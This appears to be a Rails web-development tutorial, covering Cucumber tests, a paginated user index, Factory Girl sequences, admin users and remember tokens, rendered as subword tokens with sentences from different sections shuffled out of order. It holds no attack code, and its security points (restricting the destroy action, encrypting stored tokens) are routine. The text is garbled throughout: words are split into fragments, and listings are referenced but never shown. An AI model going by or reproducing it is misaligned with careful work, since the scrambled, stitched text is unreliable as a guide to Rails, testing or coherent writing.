▁For ▁instance , ▁we ▁don ' t ▁test ▁how ▁long ▁the ▁`` remember ▁me '' ▁cookie ▁last s ▁or ▁whether ▁it ▁get s ▁set ▁at ▁all .
▁It ▁is ▁possible ▁to ▁do ▁so , ▁but ▁experience ▁shows ▁that ▁direct ▁tests ▁of ▁cookie ▁values ▁are ▁brittle ▁and ▁have ▁a ▁t end en c y ▁to ▁rely ▁on ▁implementation ▁details ▁that ▁some times ▁change ▁from ▁one ▁Rails ▁release ▁to ▁the ▁next .
▁A long ▁the ▁way , ▁we ' ll ▁learn ▁about ▁p o p ul at ing ▁the ▁database ▁with ▁sample ▁users ▁and ▁\ emph { p a g in at ing } ▁the ▁user ▁output ▁so ▁that ▁the ▁index ▁page ▁can ▁scale ▁up ▁to ▁display ▁a ▁ potentially ▁large ▁number ▁of ▁users .
▁The ▁result ▁is ▁break ing ▁tests ▁for ▁application ▁code ▁that ▁ still ▁works ▁fine .
▁By ▁focus ing ▁on ▁high - level ▁functionality --- ve r ify ing ▁that ▁users ▁can ▁sign ▁in , ▁sta y ▁signed ▁in ▁from ▁page ▁to ▁page , ▁and ▁can ▁sign ▁out --- we ▁test ▁the ▁core ▁application ▁code ▁without ▁focus ing ▁on ▁less ▁important ▁details .
▁Having ▁finished ▁the ▁foundation ▁of ▁the ▁sample ▁application ' s ▁authentication ▁system , ▁we ' re ▁going ▁to ▁take ▁this ▁opportunit y ▁to ▁show ▁how ▁to ▁write ▁signin ▁tests ▁using ▁\ href { http :// c u k es . info }{ C u c um b er }, ▁a ▁popular ▁tool ▁for ▁behavior - driven ▁development ▁that ▁ en j o y s ▁significant ▁popular ity ▁in ▁the ▁Ruby ▁community .
▁A ▁mockup ▁of ▁the ▁user ▁index , ▁with ▁pagination ▁and ▁a ▁`` Users '' ▁ nav ▁link . ~\ href { http :// railstutorial . org / images / figures / user _ index _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁A lthough ▁we ' ll ▁keep ▁individual ▁user ▁\ k ode { show } ▁pages ▁visible ▁to ▁all ▁site ▁visit or s , ▁the ▁user ▁\ k ode { index } ▁will ▁be ▁restrict ed ▁to ▁signed - in ▁users ▁so ▁that ▁there ' s ▁a ▁limit ▁to ▁how ▁much ▁un register ed ▁users ▁can ▁see ▁by ▁default .
▁This ▁section ▁is ▁optional ▁and ▁can ▁be ▁skip ped ▁without ▁ lo s s ▁of ▁continu ity .
▁Cucumber ▁allows ▁the ▁definition ▁of ▁plain - text ▁\ emph { st or ies } ▁ de sc r i b ing ▁application ▁behavior .
▁as ▁show n ▁in ▁Listing ~\ ref { code : protected _ index _ test }.
▁M any ▁Rails ▁programmer s ▁find ▁Cucumber ▁es pecially ▁convenient ▁when ▁doing ▁client ▁work ; ▁since ▁they ▁can ▁be ▁read ▁even ▁by ▁non - technical ▁users , ▁Cucumber ▁tests ▁can ▁be ▁ shared ▁with ▁( and ▁can ▁some times ▁even ▁be ▁written ▁by ) ▁the ▁client .
▁Testing ▁that ▁the ▁\ k ode { index } ▁action ▁is ▁ protected .
▁Of ▁course , ▁using ▁a ▁testing ▁framework ▁that ▁is n ' t ▁pure ▁Ruby ▁has ▁a ▁down side , ▁and ▁I ▁find ▁that ▁the ▁plain - text ▁ st or ies ▁can ▁be ▁a ▁bit ▁verb o se .
▁N ever the less , ▁Cucumber ▁does ▁have ▁a ▁place ▁in ▁the ▁Ruby ▁testing ▁tool k it , ▁and ▁I ▁es pecially ▁like ▁its ▁emphasi s ▁on ▁high - level ▁behavior ▁over ▁ low - level ▁implementation .
▁S ince ▁the ▁emphasi s ▁in ▁this ▁book ▁is ▁on ▁RSpec ▁and ▁Capybara , ▁the ▁present ation ▁that ▁follows ▁is ▁necessar ily ▁ super fi cial ▁and ▁in c omplete , ▁and ▁will ▁be ▁a ▁bit ▁light ▁on ▁ ex p la n ation .
▁It s ▁purpose ▁is ▁just ▁to ▁give ▁you ▁a ▁taste ▁of ▁Cucumber ▁( c r is p ▁and ▁ j u ic y , ▁no ▁do u b t ) --- if ▁it ▁ str ike s ▁your ▁f an c y , ▁there ▁are ▁entire ▁book s ▁on ▁the ▁subject ▁wait ing ▁to ▁ satisf y ▁your ▁app et ite .
▁ Adding ▁the ▁\ text tt { c u c um b er - rails } ▁gem ▁to ▁the ▁\ k ode { Gemfile . }
▁as ▁show n ▁in ▁Listing ~\ ref { code : signed _ in _ user _ index }.
▁ Requir ing ▁a ▁signed - in ▁user ▁for ▁the ▁\ k ode { index } ▁action .
▁To ▁set ▁up ▁the ▁application ▁to ▁use ▁Cucumber , ▁we ▁next ▁generate ▁some ▁necessary ▁support ▁files ▁and ▁directories :
▁This ▁creates ▁a ▁\ k ode { feature s / } ▁directory ▁where ▁the ▁files ▁ associated ▁with ▁Cucumber ▁will ▁live .
▁The ▁next ▁set ▁of ▁tests ▁make s ▁sure ▁that , ▁for ▁signed - in ▁users , ▁the ▁index ▁page ▁has ▁the ▁right ▁title / content ▁and ▁list s ▁all ▁of ▁the ▁site ' s ▁users .
▁Cucumber ▁features ▁are ▁description s ▁of ▁expected ▁behavior ▁using ▁a ▁plain - text ▁language ▁called ▁\ href { https :// github . com / c u c um b er / g h er k in }{ G h er k in }.
▁The ▁method ▁is ▁to ▁make ▁three ▁ factory ▁users ▁( sign ing ▁in ▁as ▁the ▁first ▁one ) ▁and ▁the n ▁verify ▁that ▁the ▁index ▁page ▁has ▁a ▁list ▁element ▁(\ k ode { li }) ▁tag ▁for ▁the ▁name ▁of ▁each ▁one .
▁G h er k in ▁tests ▁read ▁much ▁like ▁well - written ▁RSpec ▁examples , ▁but ▁because ▁they ▁are ▁plain - text ▁they ▁are ▁more ▁accessible ▁to ▁those ▁more ▁com for table ▁reading ▁English ▁than ▁Ruby ▁code .
▁as ▁show n ▁in ▁Listing ~\ ref { code : user _ index _ tests }.
▁in ▁Listing ~\ ref { code : initial _ failing _ signin _ test } ▁and
▁Tests ▁for ▁the ▁user ▁index ▁page .
▁To ▁get ▁started , ▁we ' ll ▁create ▁a ▁file ▁in ▁the ▁\ k ode { feature s / } ▁directory ▁called ▁\ k ode { sign ing \_ in . feature }.
▁Cucumber ▁features ▁start ▁with ▁a ▁short ▁description ▁of ▁the ▁feature , ▁as ▁follows :
▁Then ▁they ▁add ▁individual ▁\ emph { sc en ar io s }.
▁For ▁example , ▁to ▁test ▁ unsuccessful ▁signin , ▁we ▁could ▁write ▁the ▁following ▁scenario :
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ index }.
▁Similar ly , ▁to ▁test ▁successful ▁signin , ▁we ▁could ▁add ▁this :
▁in ▁Listing ~\ ref { code : signin _ feature s }.
▁Cucumber ▁features ▁to ▁test ▁user ▁signin .
▁To ▁make ▁the ▁actual ▁index ▁page , ▁we ▁need ▁to ▁make ▁a ▁view ▁that ▁iterate s ▁through ▁the ▁users ▁and ▁wrap s ▁each ▁one ▁in ▁an ~\ k ode { li } ▁tag .
▁To ▁run ▁the ▁features , ▁we ▁use ▁the ▁\ k ode { c u c um b er } ▁executable :
▁The ▁code ▁in ▁Listing ~\ ref { code : user _ index _ view } ▁uses ▁the ▁result ▁of ▁Listing ~\ ref { code : gravatar _ option } ▁from ▁Section ~\ ref { sec : signup _ exercises }, ▁which ▁allows ▁us ▁to ▁pass ▁an ▁option ▁to ▁the ▁Gravatar ▁helper ▁specify ing ▁a ▁size ▁other ▁than ▁the ▁default .
▁In ▁this ▁context , ▁it ' s ▁worth ▁noting ▁that , ▁like ▁RSpec , ▁Cucumber ▁can ▁be ▁invoked ▁using ▁a ▁Rake ▁task :
▁( For ▁reason s ▁that ▁escape ▁me , ▁this ▁is ▁some times ▁written ▁as ▁\ k ode { rake ▁c u c um b er : o k }. )
▁All ▁we ' ve ▁done ▁so ▁far ▁is ▁write ▁some ▁plain ▁text , ▁so ▁it ▁should n ' t ▁be ▁surpris ing ▁that ▁the ▁Cucumber ▁scenario s ▁are n ' t ▁yet ▁passing .
▁To ▁get ▁the ▁test ▁suite ▁to ▁green , ▁we ▁need ▁to ▁add ▁a ▁\ emph { step } ▁file ▁that ▁map s ▁the ▁plain - text ▁lines ▁to ▁Ruby ▁code .
▁The ▁step ▁file ▁go es ▁in ▁the ▁\ k ode { feature s / step \_ de f in it ion s } ▁directory ; ▁we ' ll ▁call ▁it ▁\ k ode { authentication \_ step s . rb }.
▁A ▁test ▁for ▁the ▁`` Users '' ▁link ▁URL .
▁The ▁\ k ode { F e at ure } ▁and ▁\ k ode { S ce n ar io } ▁lines ▁are ▁main ly ▁for ▁documentation , ▁but ▁each ▁of ▁the ▁other ▁lines ▁needs ▁some ▁corresponding ▁Ruby .
▁For ▁example , ▁the ▁line
▁in ▁the ▁feature ▁file ▁get s ▁handle d ▁by ▁the ▁step ▁definition
▁In ▁the ▁feature , ▁\ k ode { G ive n } ▁is ▁just ▁a ▁string , ▁but ▁in ▁the ▁step ▁file ▁\ k ode { G ive n } ▁is ▁a ▁\ emph { method } ▁that ▁take s ▁a ▁regular ▁expression ▁and ▁a ▁block .
▁The ▁regex ▁matches ▁the ▁text ▁of ▁the ▁line ▁in ▁the ▁scenario , ▁and ▁the ▁contents ▁of ▁the ▁block ▁are ▁the ▁Ruby ▁code ▁needed ▁to ▁implement ▁the ▁step .
▁In ▁this ▁case , ▁`` a ▁user ▁visit s ▁the ▁signin ▁page '' ▁is ▁implemented ▁by
▁If ▁this ▁look s ▁ familiar , ▁it ▁should : ▁it ' s ▁just ▁Capybara , ▁which ▁is ▁included ▁by ▁default ▁in ▁Cucumber ▁step ▁files .
▁The ▁next ▁two ▁lines ▁should ▁also ▁look ▁ familiar ; ▁the ▁scenario ▁steps
▁in ▁the ▁feature ▁file ▁are ▁handle d ▁by ▁these ▁steps :
▁The ▁first ▁step ▁also ▁uses ▁Capybara , ▁while ▁the ▁second ▁uses ▁Capybara ' s ▁\ k ode { page } ▁object ▁with ▁RSpec . ▁E v id ent ly , ▁all ▁the ▁testing ▁work ▁we ' ve ▁done ▁so ▁far ▁with ▁RSpec ▁and ▁Capybara ▁is ▁also ▁useful ▁with ▁Cucumber .
▁The ▁rest ▁of ▁the ▁steps ▁proceed ▁similar ly .
▁in ▁Listing ~\ ref { code : authentication _ step s }.
▁T ry ▁adding ▁one ▁step ▁at ▁a ▁time , ▁running
▁With ▁that , ▁the ▁user ▁index ▁is ▁fully ▁functional , ▁with ▁all ▁tests ▁passing :
▁each ▁time ▁un til ▁the ▁tests ▁pass .
▁The ▁complete ▁steps ▁needed ▁to ▁get ▁the ▁signin ▁features ▁to ▁pass .
▁The ▁user ▁index ▁page ▁\ href { http :// localhost :3000/ users }{/ users } ▁with ▁only ▁one ▁user . ~\ href { http :// railstutorial . org / images / figures / user _ index _ only _ one _ bootstrap - full . png }{ ( full ▁size )}
▁Having ▁written ▁some ▁simple ▁Cucumber ▁scenario s , ▁it ' s ▁worth ▁compar ing ▁the ▁result ▁to ▁the ▁equivalent ▁RSpec ▁examples .
▁in ▁Listing ~\ ref { code : signin _ feature s } ▁and
▁Next , ▁we ' ll ▁add ▁a ▁Rake ▁task ▁to ▁create ▁sample ▁users .
▁Then ▁take ▁a ▁look ▁at ▁the ▁RSpec ▁request ▁spec s ▁( integration ▁tests ) :
▁as ▁seen ▁in ▁Listing ~\ ref { code : db _ populate }.
▁( This ▁is ▁a ▁bit ▁advanced , ▁so ▁don ' t ▁worry ▁too ▁much ▁about ▁the ▁details .)
▁A ▁Rake ▁task ▁for ▁p o p ul at ing ▁the ▁database ▁with ▁sample ▁users .
▁You ▁can ▁see ▁how ▁a ▁case ▁could ▁be ▁made ▁for ▁either ▁Cucumber ▁or ▁integration ▁tests .
▁Cucumber ▁features ▁are ▁easily ▁read able , ▁but ▁they ▁are ▁entire ly ▁separate ▁from ▁the ▁code ▁that ▁implement s ▁them --- a ▁property ▁that ▁ cut s ▁both ▁ways .
▁I ▁find ▁that ▁Cucumber ▁is ▁easy ▁to ▁read ▁and ▁a w k w ar d ▁to ▁write , ▁while ▁integration ▁tests ▁are ▁( for ▁a ▁programmer ) ▁a ▁little ▁hard er ▁to ▁read ▁and ▁\ emph { much } ▁easier ▁to ▁write .
▁One ▁nice ▁effect ▁of ▁Cucumber ' s ▁ se p ar ation ▁of ▁concern s ▁is ▁that ▁it ▁operat es ▁at ▁a ▁high er ▁level ▁of ▁abstract ion .
▁This ▁defines ▁a ▁task ▁\ k ode { db : populate } ▁that ▁creates ▁an ▁example ▁user ▁with ▁name ▁and ▁email ▁address ▁re p li cat ing ▁our ▁previous ▁one , ▁and ▁the n ▁make s ▁ 99 ▁more .
▁ensure s ▁that ▁the ▁Rake ▁task ▁has ▁access ▁to ▁the ▁local ▁Rails ▁environment , ▁including ▁the ▁User ▁model ▁( and ▁hence ▁\ k ode { User . create ! }).
▁This ▁no is i er ▁construction ▁make s ▁debugging ▁easier ▁by ▁avoid ing ▁ s il ent ▁errors .
▁For ▁example , ▁we ▁write
▁to ▁express ▁the ▁expect ation ▁of ▁see ing ▁an ▁error ▁message , ▁and
▁to ▁implement ▁the ▁test . ▁What ' s ▁es pecially ▁convenient ▁about ▁this ▁is ▁that ▁only ▁the ▁second ▁element ▁( the ▁step ) ▁is ▁ dependent ▁on ▁the ▁implementation , ▁so ▁that ▁if ▁we ▁change , ▁e . g . , ▁the ▁CSS ▁class ▁used ▁for ▁error ▁messages , ▁the ▁feature ▁file ▁would ▁sta y ▁the ▁same .
▁( I ' ve ▁take n ▁the ▁ lib er t y ▁of ▁associat ing ▁the ▁first ▁few ▁sample ▁addresses ▁with ▁ photos ▁so ▁that ▁they ' re ▁not ▁all ▁the ▁default ▁Gravatar ▁image .)
▁In ▁this ▁ ve in , ▁it ▁m ight ▁make ▁you ▁un h app y ▁to ▁write
▁The ▁user ▁index ▁page ▁\ href { http :// localhost :3000/ users }{/ users } ▁with ▁100 ▁sample ▁users . ~\ href { http :// railstutorial . org / images / figures / user _ index _ all _ bootstrap - full . png }{ ( full ▁size )}
▁in ▁a ▁b un ch ▁of ▁place s , ▁when ▁what ▁you ▁really ▁want ▁is ▁to ▁indicate ▁that ▁the ▁page ▁should ▁have ▁an ▁error ▁message .
▁This ▁practice ▁couple s ▁the ▁test ▁t ight ly ▁to ▁the ▁implementation , ▁and ▁we ▁would ▁have ▁to ▁change ▁it ▁every where ▁if ▁the ▁implementation ▁changed .
▁In ▁the ▁context ▁of ▁pure ▁RSpec , ▁there ▁is ▁a ▁solution , ▁which ▁is ▁to ▁use ▁a ▁\ emph { custom ▁match er }, ▁allow ing ▁us ▁to ▁write ▁the ▁following ▁instead :
▁The ▁code ▁itself ▁look s ▁like ▁this :
▁We ▁can ▁also ▁define ▁helper ▁functions ▁for ▁common ▁operations :
▁I ▁find ▁this ▁approach ▁to ▁be ▁more ▁flexible ▁than ▁Cucumber ▁step ▁definition s , ▁particular ly ▁when ▁the ▁match ers ▁or ▁should ▁helpers ▁natural ly ▁take ▁an ▁argument , ▁such ▁as ▁\ k ode { valid \_ signin ( user ) }.
▁Because ▁the ▁\ text tt { will \_ paginate } ▁gem ▁is ▁in ▁ wide ▁use , ▁there ' s ▁no ▁need ▁to ▁test ▁it ▁ th or ough ly , ▁so ▁we ' ll ▁take ▁a ▁light we ight ▁approach .
▁ Step ▁definition s ▁can ▁re p li c ate ▁this ▁functionality ▁with ▁regex ▁match ers , ▁but ▁I ▁generally ▁find ▁this ▁approach ▁to ▁be ▁more ▁( c u ) c um b er some .
▁First , ▁we ' ll ▁test ▁for ▁a ▁\ k ode { div } ▁with ▁CSS ▁class ▁`` pagination '' , ▁which ▁is ▁what ▁get s ▁output ▁by ▁\ text tt { will \_ paginate }.
▁ Adding ▁a ▁helper ▁method ▁and ▁a ▁custom ▁RSpec ▁match er .
▁Then ▁we ' ll ▁verify ▁that ▁the ▁correct ▁users ▁appear ▁on ▁the ▁first ▁page ▁of ▁results .
▁This ▁requires ▁the ▁use ▁of ▁the ▁\ k ode { paginate } ▁method , ▁which ▁we ' ll ▁cover ▁short ly .
▁There ▁are ▁many ▁other ▁examples ▁of ▁co up l ing ▁between ▁our ▁tests ▁and ▁the ▁site ' s ▁implementation .
▁As ▁before , ▁we ' ll ▁use ▁ Factory ▁Girl ▁to ▁simul ate ▁users , ▁but ▁immediately ▁we ▁have ▁a ▁problem : ▁user ▁email ▁addresses ▁must ▁be ▁unique , ▁which ▁would ▁appear ▁to ▁require ▁creating ▁more ▁than ▁30 ▁users ▁by ▁hand --- a ▁terribl y ▁cumbersome ▁job .
▁In ▁addition , ▁when ▁testing ▁for ▁user ▁list ing s ▁it ▁would ▁be ▁convenient ▁for ▁them ▁all ▁to ▁have ▁different ▁names .
▁We ' ve ▁covered ▁a ▁lot ▁of ▁ ground ▁in ▁this ▁chapter , ▁ transform ing ▁our ▁pro m is ing ▁but ▁un form ed ▁application ▁into ▁a ▁site ▁capab le ▁of ▁the ▁full ▁suite ▁of ▁re g ist r ation ▁and ▁login ▁behavior s .
▁For t un ate ly , ▁ Factory ▁Girl ▁an tic ip ate s ▁this ▁issue , ▁and ▁provides ▁\ emph { sequence s } ▁to ▁solve ▁it .
▁All ▁that ▁is ▁needed ▁to ▁complete ▁the ▁authentication ▁functionality ▁is ▁to ▁restrict ▁access ▁to ▁pages ▁base d ▁on ▁signin ▁status ▁and ▁user ▁identity .
▁Then ▁push ▁up ▁the ▁remote ▁GitHub ▁repository ▁and ▁the ▁Heroku ▁production ▁server :
▁Re factor ▁the ▁signin ▁form ▁to ▁use ▁\ k ode { form \_ tag } ▁in ▁place ▁of ▁\ k ode { form \_ for }.
▁Instead , ▁we ▁can ▁arrange ▁for ▁a ▁sequence ▁of ▁names ▁and ▁email ▁addresses ▁using ▁the ▁\ k ode { sequence } ▁method :
▁ Make ▁sure ▁the ▁test ▁suite ▁ still ▁passes .
▁Here ▁\ k ode { sequence } ▁take s ▁a ▁symbol ▁corresponding ▁to ▁the ▁desired ▁attribute ▁( such ▁as ▁\ k ode { : name }) ▁and ▁a ▁block ▁with ▁one ▁variable , ▁which ▁we ▁have ▁called ~\ k ode { n }.
▁\ emph { Hint } : ▁See ▁the ▁\ href { http :// r ailscasts . com / episodes / 27 0 - authentication - in - rails - 3- 1 }{ RailsCast ▁on ▁authentication ▁in ▁Rails ~3 . 1 }, ▁and ▁note ▁in ▁particular ▁the ▁change ▁in ▁the ▁structure ▁of ▁the ▁\ k ode { params } ▁hash .
▁U p on ▁ success ive ▁ invocation s ▁of ▁the ▁\ k ode { Factory G ir l } ▁method ,
▁\ emph { Extra ▁c r edit : } ▁Or g an ize ▁the ▁support ▁code ▁into ▁separate ▁files ▁and ▁module s , ▁and ▁get ▁everything ▁to ▁work ▁by ▁including ▁the ▁module s ▁properly ▁in ▁the ▁spec ▁helper ▁file .
▁in ▁Listing ~\ ref { code : factory _ sequence }.
▁Defin ing ▁a ▁ Factory ▁Girl ▁sequence .
▁App ly ing ▁the ▁idea ▁of ▁ factory ▁sequence s , ▁we ▁can ▁make ▁30 ▁users ▁in ▁our ▁test , ▁which ▁( as ▁we ▁will ▁see ) ▁will ▁be ▁ s u ff ic i ent ▁to ▁invoke ▁pagination :
▁Note ▁here ▁the ▁use ▁of ▁\ k ode { before (: all ) }, ▁which ▁ensure s ▁that ▁the ▁sample ▁users ▁are ▁created ▁\ emph { on ce }, ▁before ▁all ▁the ▁tests ▁in ▁the ▁block .
▁This ▁is ▁an ▁opt i m i z ation ▁for ▁speed , ▁as ▁creating ▁30 ▁users ▁can ▁be ▁ s low ▁on ▁some ▁systems .
▁We ▁use ▁the ▁complement ary ▁method ▁\ k ode { after (: all )} ▁to ▁delete ▁the ▁users ▁once ▁we ' re ▁done .
▁in ▁Listing ~\ ref { code : will _ paginate _ test }.
▁Tests ▁for ▁pagination .
▁The ▁user ▁index ▁page ▁\ href { http :// localhost :3000/ users }{/ users } ▁with ▁pagination . ~\ href { http :// railstutorial . org / images / figures / user _ index _ pagination _ rails _ 3 _ bootstrap - full . png }{ ( full ▁size )}
▁You ▁should ▁also ▁verify ▁that ▁the ▁tests ▁are ▁passing :
▁The ▁first ▁refactoring ▁attempt ▁at ▁the ▁index ▁view .
▁As ▁with ▁any ▁refactoring , ▁you ▁should ▁verify ▁that ▁the ▁test ▁suite ▁is ▁ still ▁green ▁after ▁changing ▁the ▁application ▁code :
▁But ▁first , ▁we ' ll ▁create ▁the ▁class ▁of ▁ administrative ▁users ▁authoriz ed ▁to ▁do ▁so .
▁A ▁mockup ▁of ▁the ▁user ▁index ▁with ▁delete ▁links . ~\ href { http :// railstutorial . org / images / figures / user _ index _ delete _ links _ mockup _ bootstrap - full . png }{ ( full ▁size )}
▁We ▁will ▁identify ▁privilege d ▁ administrative ▁users ▁with ▁a ▁boolean ▁\ k ode { admin } ▁attribute ▁in ▁the ▁User ▁model , ▁which , ▁as ▁we ' ll ▁see , ▁will ▁automatically ▁lead ▁to ▁an ▁\ k ode { admin ?}\ ▁boolean ▁method ▁to ▁test ▁for ▁admin ▁status .
▁in ▁Listing ~\ ref { code : admin _ spec s }.
▁Tests ▁for ▁an ▁\ k ode { admin } ▁attribute .
▁Also ▁note ▁that ▁the ▁line
▁implie s ▁( via ▁the ▁RSpec ▁boolean ▁convention ) ▁that ▁the ▁user ▁should ▁have ▁an ▁\ k ode { admin ?}\ ▁boolean ▁method .
▁As ▁a ▁result , ▁the ▁admin ▁tests ▁should ▁pass :
▁The ▁sample ▁data ▁p o p ul at or ▁code ▁with ▁an ▁admin ▁user .
▁Then ▁reset ▁the ▁database ▁and ▁re - populate ▁the ▁sample ▁data :
▁To ▁write ▁tests ▁for ▁the ▁delete ▁functionality , ▁it ' s ▁helpful ▁to ▁be ▁able ▁to ▁have ▁a ▁ factory ▁to ▁create ▁admin s .
▁as ▁show n ▁in ▁Listing ~\ ref { code : admin _ factory }.
▁ Adding ▁a ▁ factory ▁for ▁ administrative ▁users .
▁Ou r ▁security ▁model ▁requires ▁that ▁ordinar y ▁users ▁not ▁see ▁delete ▁links :
▁But ▁ administrative ▁users ▁should ▁see ▁such ▁links , ▁and ▁by ▁click ing ▁on ▁a ▁delete ▁link ▁we ▁expect ▁an ▁admin ▁to ▁delete ▁the ▁user , ▁i . e . , ▁to ▁change ▁the ▁\ k ode { User } ▁count ▁by ~\ k ode { - 1 } :
▁This ▁includes ▁the ▁code ▁\ k ode { match : ▁: first }, ▁which ▁tell s ▁Capybara ▁that ▁we ▁don ' t ▁care ▁\ emph { which } ▁delete ▁link ▁it ▁click s ; ▁it ▁should ▁just ▁click ▁the ▁first ▁one ▁it ▁see s .
▁Note ▁also ▁that ▁we ▁have ▁added ▁a ▁test ▁to ▁verify ▁that ▁the ▁admin ▁does ▁not ▁see ▁a ▁link ▁to ▁delete ▁h i m self .
▁in ▁Listing ~\ ref { code : delete _ link _ tests }.
▁Tests ▁for ▁delete ▁links .
▁The ▁user ▁index ▁\ href { http :// localhost :3000/ users }{/ users } ▁with ▁delete ▁links . ~\ href { http :// railstutorial . org / images / figures / index _ delete _ links _ rails _ 3 _ bootstrap - full . png }{ ( full ▁size )}
▁Note ▁that ▁we ▁also ▁add ▁\ k ode { : destroy } ▁to ▁the ▁\ k ode { signed \_ in \_ user } ▁before ▁filter .
▁To ▁secure ▁the ▁site ▁properly , ▁we ▁also ▁need ▁access ▁control ▁on ▁the ▁\ k ode { destroy } ▁action , ▁so ▁our ▁tests ▁should ▁check ▁not ▁only ▁that ▁admin s ▁\ emph { can } ▁delete ▁users , ▁but ▁also ▁that ▁other ▁users ▁\ emph { can ' t }.
▁The ▁results ▁appear ▁in ▁Listing ~\ ref { code : delete _ destroy _ test }.
▁A ▁test ▁for ▁protect ing ▁the ▁\ k ode { destroy } ▁action .
▁In ▁principle , ▁there ' s ▁ still ▁a ▁minor ▁security ▁hole , ▁which ▁is ▁that ▁an ▁admin ▁could ▁delete ▁h i m self ▁by ▁is s u ing ▁a ▁\ text tt { DELETE } ▁request ▁directly .
▁As ▁you ▁m ight ▁suspect ▁by ▁now , ▁the ▁application ▁code ▁uses ▁a ▁before ▁filter , ▁this ▁time ▁to ▁restrict ▁access ▁to ▁the ▁\ k ode { destroy } ▁action ▁to ▁admin s .
▁At ▁this ▁point , ▁all ▁the ▁tests ▁should ▁be ▁passing , ▁and ▁the ▁Users ▁resource --- with ▁its ▁controller , ▁model , ▁and ▁views --- is ▁functional ly ▁complete .
▁Those ▁users ▁could n ' t ▁even ▁sign ▁up ; ▁now ▁users ▁can ▁sign ▁up , ▁sign ▁in , ▁sign ▁out , ▁view ▁their ▁profile s , ▁edit ▁their ▁settings , ▁and ▁see ▁an ▁index ▁of ▁all ▁users --- and ▁some ▁can ▁even ▁destroy ▁other ▁users .
▁These ▁chapter s ▁will ▁introduce ▁some ▁of ▁the ▁most ▁powerful ▁features ▁of ▁Rails , ▁including ▁data ▁model ing ▁with ▁\ k ode { has \_ many } ▁and ▁\ k ode { has \_ many ▁through }.
▁( O p t ion al ▁gems ▁may ▁be ▁system - dependent ▁and ▁are ▁comment ed ▁out .
▁You ▁can ▁uncomment ▁them ▁to ▁see ▁if ▁they ▁work ▁on ▁your ▁system .)
▁# ▁The ▁following ▁optional ▁lines ▁are ▁part ▁of ▁the ▁advanced ▁setup .
▁# ▁gem ▁' guard - rspec ' , ▁' 2 . 5.0 '
▁# ▁gem ▁' guard - s p or k ' , ▁' 1 . 5.0 '
▁# ▁gem ▁' child process ' , ▁' 0 . 3 . 6 '
▁# ▁gem ▁' w in 3 2 console ' , ▁' 1 . 3 . 2 '
▁Be ▁sure ▁to ▁get ▁first ▁to ▁Re d , ▁and ▁the n ▁to ▁G re en .
▁(\ emph { Hint } : ▁Your ▁first ▁step ▁should ▁be ▁to ▁\ emph { add } ▁\ k ode { admin } ▁to ▁the ▁list ▁of ▁ permitted ▁parameters ▁in ▁\ k ode { user \_ params }. )
▁The ▁current ▁authentication ▁tests ▁check ▁that ▁navigation ▁links ▁such ▁as ▁`` Pro file '' ▁and ▁`` S et ting s '' ▁appear ▁when ▁a ▁user ▁is ▁signed ▁in .
▁Add ▁tests ▁to ▁make ▁sure ▁that ▁these ▁links ▁\ emph { do n ' t } ▁appear ▁when ▁a ▁user ▁is n ' t ▁signed ▁in .
▁You ▁will ▁also ▁have ▁to ▁update ▁the ▁tests , ▁as ▁the ▁forms ▁are n ' t ▁current ly ▁\ emph { exactly } ▁the ▁same ; ▁identify ▁the ▁ s l ight ▁difference ▁and ▁update ▁the ▁tests ▁according ly .
▁Writ e ▁a ▁test ▁to ▁make ▁sure ▁that ▁the ▁ friendly ▁forwarding ▁only ▁forward s ▁to ▁the ▁given ▁URL ▁the ▁first ▁time .
▁On ▁subsequent ▁signin ▁attempt s , ▁the ▁forwarding ▁URL ▁should ▁ r ever t ▁to ▁the ▁default ▁( i . e . , ▁the ▁profile ▁page ).
▁The ▁new ▁user ▁view ▁with ▁partial .
▁A ▁test ▁for ▁forwarding ▁to ▁the ▁default ▁page ▁after ▁ friendly ▁forwarding .
▁< n > ▁end
▁We ▁also ▁test ▁that ▁the ▁error ▁message ▁contains ▁the ▁text ▁\ k ode {" In valid " }.
▁P utting ▁these ▁together , ▁the ▁test ▁look s ▁for ▁an ▁element ▁of ▁the ▁following ▁form :
▁Ou r ▁plan ▁is ▁to ▁store ▁the ▁base 64 ▁token ▁on ▁the ▁browser , ▁and ▁the n ▁store ▁an ▁encrypted ▁version ▁in ▁the ▁database .
▁We ▁can ▁the n ▁sign ▁users ▁in ▁automatically ▁by ▁retriev ing ▁the ▁token ▁from ▁the ▁cookie , ▁encrypt ing ▁it , ▁and ▁the n ▁search ing ▁for ▁a ▁remember ▁token ▁matching ▁the ▁encrypted ▁value .
▁The ▁reason ▁for ▁storing ▁only ▁encrypted ▁token s ▁is ▁so ▁that , ▁even ▁if ▁our ▁entire ▁database ▁is ▁compromise d , ▁the ▁attacker ▁ still ▁won ' t ▁be ▁able ▁to ▁use ▁the ▁remember ▁token s ▁to ▁sign ▁in .
▁For ▁more ▁details ▁on ▁the ▁kind ▁of ▁callbacks ▁supported ▁by ▁Active ▁Record , ▁see ▁the ▁\ href { http :// guides . rubyonrails . org / v 3 . 1.23 / active _ record _ validations _ callback s . html }{ d is c us s ion ▁of ▁callbacks ▁at ▁the ▁Rails ▁G u id es }.
▁S ince ▁the ▁encrypted ▁\ k ode { S ec ure R and o m . url safe \_ base 64 } ▁string ▁is ▁defin ite ly ▁\ emph { not } ▁blank , ▁the ▁tests ▁for ▁the ▁User ▁model ▁should ▁now ▁be ▁passing :
▁Note ▁that , ▁because ▁the ▁remember ▁token ▁in ▁the ▁database ▁is ▁encrypted , ▁we ▁first ▁need ▁to ▁encrypt ▁the ▁token ▁from ▁the ▁cookie ▁before ▁using ▁it ▁to ▁find ▁the ▁user ▁in ▁the ▁database .
▁In ▁the ▁process ▁of ▁ putting ▁the ▁new ▁links ▁into ▁the ▁layout , ▁we ' ll ▁take ▁advantage ▁of ▁Bootstrap ' s ▁ability ▁to ▁make ▁ drop d own ▁menu s , ▁which ▁you ▁can ▁read ▁more ▁about ▁on ▁the ▁\ href { http :// twitter . github . com / bootstrap / com p on ent s . html }{ Bootstrap ▁components ▁page }.
▁More over , ▁this ▁sub set ▁is ▁\ emph { different } ▁from ▁the ▁usual ▁approach es ▁to ▁learning ▁Ruby , ▁which ▁is ▁why , ▁if ▁your ▁goal ▁is ▁making ▁dynamic ▁web ▁applications , ▁I ▁recommend ▁learning ▁Rails ▁first , ▁ pick ing ▁up ▁bit s ▁of ▁Ruby ▁along ▁the ▁way .
